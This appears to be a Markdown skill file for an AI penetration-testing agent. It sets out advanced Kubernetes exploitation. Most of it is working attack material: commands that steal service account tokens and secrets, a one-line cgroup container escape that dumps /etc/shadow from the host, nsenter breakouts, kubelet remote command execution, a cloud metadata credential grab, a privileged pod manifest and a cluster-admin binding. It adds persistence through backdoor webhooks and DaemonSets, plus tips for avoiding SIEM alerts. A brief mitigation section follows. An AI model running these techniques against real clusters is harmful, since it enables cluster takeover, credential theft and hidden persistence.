<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: kubernetes
description: Advanced exploitation techniques and post-exploitation for Kubernetes clusters, including container escapes, RBAC abuse, and API server attacks.
---

# Advanced Kubernetes Exploitation

Kubernetes (K8s) is the industry standard for container orchestration. Due to its sheer complexity, massive attack surface, and default "flat" networking model, it presents numerous opportunities for privilege escalation, lateral movement, and complete cluster takeover once initial access (e.g., an RCE in a single pod) is achieved.

## Core Concepts & Architecture

- **Control Plane (Master Node):** Runs the API Server (`kube-apiserver`), `etcd` (state database), Scheduler, and Controller Manager.
- **Worker Nodes:** Run `kubelet` (node agent), `kube-proxy` (network routing), and the actual container runtime (Docker, containerd, CRI-O).
- **Service Account (SA):** An identity attached to a pod. Its token is automatically mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`.

---

## 1. Initial Access & Reconnaissance

Assuming you have gained command execution inside a pod (via an application vulnerability):

### Recon within the Pod

```bash
# Check current Service Account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Decode the JWT token to see standard claims (namespace, SA name)
# Can use jwt_tool or cyberchef

# Check mounted secrets or volumes
mount | grep -i "secret\|configmap\|volume"
ls -la /etc/secret-volume
ls -la /etc/config-volume

# Check environment variables for hardcoded credentials or service IPs
env | grep -i "kuber\|pass\|token\|key\|secret\|url"

# Find K8s API server IP (usually injected as env var or DNS)
echo $KUBERNETES_SERVICE_HOST
```

### Talking to the API Server

Use the discovered Service Account token to query the API server. If `kubectl` isn't installed, use `curl`.

```bash
# Set variables
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Check what permissions the current Service Account has (SelfSubjectRulesReview)
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"spec":{"namespace":"default"}}' | jq

# List secrets in the current namespace (if permitted)
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets | jq

# List all pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods | jq
```

---

## 2. Container Escapes to Node

Escaping the container boundaries grants `root` access to the underlying Worker Node infrastructure.

### A. Privileged Container Escape

A pod running with `securityContext: privileged: true` essentially has full host capabilities.

1.  **Check for privileged status:** `capsh --print` (look for `CAP_SYS_ADMIN`). Also check if the host filesystem is mounted (`mount | grep /host`).
2.  **Escape via cgroups (release_agent):**
    ```bash
    d=$(dirname $(ls -x /s*/fs/c*/*/r* |head -n1))
    mkdir -p $d/w;echo 1 >$d/w/notify_on_release
    t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
    echo $t/c >$d/release_agent;printf '#!/bin/sh\ncat /etc/shadow >'$t/o >/c;
    chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
    ```
3.  **Escape via HostPath Mount:** If `/` or `/etc` from the host is mounted in the pod (e.g., at `/hostfs`), simply `chroot /hostfs` or deploy a malicious cronjob/SSH key to the host.

### B. Exploiting Shared Host Namespaces

If the pod shares the host's namespaces (`hostPID: true`, `hostNetwork: true`, `hostIPC: true`):

-   **hostPID:** Allows seeing all processes on the host. You can inject shellcode into a host process or use `nsenter` to jump into the host's namespace.
    ```bash
    nsenter -t 1 -m -u -i -n -p -- bash
    ```
-   **hostNetwork:** The pod shares the host's network interfaces. You can bind to privileged ports on the host, intercept node traffic (sniffing), or directly access the `kubelet` API running on `localhost`.

### C. Kernel Exploits (Dirty Pipe, Dirty COW)

If the node's kernel is outdated, standard Linux kernel exploits can be used to gain root on the node, escaping the container boundaries.

---

## 3. Kubernetes Specific Escalations

### A. Kubelet API (Port 10250)

The `kubelet` service runs on every node. By default, it requires authentication. However, if it's misconfigured to allow anonymous access (`--anonymous-auth=true`), it's highly critical.

1.  **Find Kubelets:** Scan the internal network for port `10250/tcp`. Usually, Kubelet IPs fall within the pod Subnet or Node Subnet IP ranges.
2.  **List Pods:** `curl -k https://<node-ip>:10250/pods`
3.  **Command Execution (RCE on *any* pod on that node):**
    Use the undocumented `/run` endpoint (Requires `curl` and `wscat` or custom scripts to handle the WebSocket upgrade).
    ```bash
    # POST to /run to get a redirect URL
    curl -k -X POST "https://<node-ip>:10250/run/<namespace>/<pod-name>/<container-name>" -d "cmd=ls -la"
    ```

### B. Kube-proxy / NodePort Bypass

If a node has a high port open (NodePort service), you might be able to access internal services exposed by `kube-proxy` that shouldn't be accessible from your current location, effectively bypassing network policies.

### C. Cloud Metadata API (IMDSv1/v2)

If the Kubernetes cluster is hosted on AWS (EKS), GCP (GKE), or Azure (AKS), the underlying worker node often has an IAM role attached.

```bash
# AWS Instance Metadata Service
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
*Note:* Modern managed clusters often use Pod Identity (IRSA/Workload Identity) or block the IMDS from pods via iptables/NetworkPolicies, but misconfigurations are common.

---

## 4. RBAC (Role-Based Access Control) Abuse

If the compromised Service Account token (or a token you've stolen from a secret) has high-level RBAC permissions, you can abuse those to escalate privileges cluster-wide.

### A. Creating Pods (`create pods`)

If you can create pods in a namespace (e.g., `kube-system`), deploy a malicious pod that mounts the host filesystem (`/`) or the host network, giving you full node access.

```yaml
# bad-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
  namespace: default
spec:
  containers:
  - name: shell
    image: ubuntu
    command: [ "nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--", "bash" ]
    securityContext:
      privileged: true
  hostPID: true
  hostNetwork: true
```

### B. Reading Secrets (`get/list secrets`)

If the SA can read secrets globally or in `kube-system`, immediately extract the `cluster-admin` token, default service account tokens, or database credentials.

```bash
# Get all secrets in the cluster
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets | jq

# Target the kube-system namespace specifically
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/kube-system/secrets | jq
```

### C. Creating Roles/RoleBindings (`create clusterrolebindings`)

If you can create `ClusterRoleBindings`, bind an existing high-privilege `ClusterRole` (like `cluster-admin`) to your currently compromised Service Account.

```json
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "ClusterRoleBinding",
  "metadata": {"name": "malicious-admin-binding"},
  "roleRef": {
    "apiGroup": "rbac.authorization.k8s.io",
    "kind": "ClusterRole",
    "name": "cluster-admin"
  },
  "subjects": [{
    "kind": "ServiceAccount",
    "name": "default",
    "namespace": "default"
  }]
}
```

### D. Executing into Pods (`create pods/exec`)

If allowed, use `kubectl exec` to jump from a low-privileged pod into a high-privileged pod (e.g., a pod running as root with host mounts, or a pod running database migrations with high-value secrets).

---

## 5. Control Plane Attacks & Persistence

### A. Targeting `etcd` (Port 2379)

`etcd` is the brain of the cluster. If it's exposed without client certificate authentication (rare but fatal), you can read and write all cluster state.
-   Access cluster secrets directly in plaintext.
-   Modify RoleBindings directly in the database.

### B. Admission Controller Webhooks Modification

Mutating Admission Webhooks intercept API requests to modify pod configurations before they are created. Establish persistence by creating a malicious `MutatingWebhookConfiguration` that injects a backdoor sidecar container into *every newly created pod* in the cluster.

### C. Malicious DaemonSets

Deploy a `DaemonSet` to ensure your malicious pod runs on *every single worker node* in the cluster concurrently. Excellent for clustered cryptomining or widespread data exfiltration.

---

## Tooling

```bash
# Peirates - K8s Penetration Testing Tool
peirates

# KDigger - Kubernetes Discovery and Escalation Tool
kdigger
kdigger auth # Check tokens
kdigger escalate # Attempt escapes

# Kube-hunter - Hunts for security weaknesses in clusters
kube-hunter --remote <target-ip>

# amicontained - Container introspection
amicontained

# BotB (Break out the Box)
# Exploits various container escape vulnerabilities automatically
```

## Mitigation & Defenses (Blue Team Perspective)

- **Network Policies:** Implement default-deny network policies within namespaces. Stop lateral movement before it starts.
- **RBAC Audits:** Follow the principle of least privilege. Service Accounts should never have `cluster-admin` unless absolutely necessary.
- **Pod Security Admission (PSA):** Replace deprecated PodSecurityPolicies (PSP). Enforce the `restricted` or `baseline` profile to block privileged containers, root users, and host mounts.
- **Automated Service Account Token Mounting:** Set `automountServiceAccountToken: false` on pods that don't need to talk to the K8s API server.
- **Control Plane Hardening:** Ensure `kubelet` requires authentication (`--anonymous-auth=false`), and `etcd` uses strong mTLS.

## Critical Pro Tips

1.  **The API server logs everything.** Excessive `curl` requests generating 403 Forbidden errors will set off SIEM alerts. Enumerate intelligently. Use `SelfSubjectRulesReview` instead of trial-and-error.
2.  **Focus on Cloud Metadata:** If the cluster runs in the cloud, grabbing cloud IAM credentials from the worker node is often a faster path to environment takeover than pure Kubernetes RBAC abuse.
3.  **Always Map the Network:** Don't assume the environment is flat. Sometimes, compromising a pod in Namespace A gives you the network path to access an internal database in Namespace B that cannot be reached from the outside world.
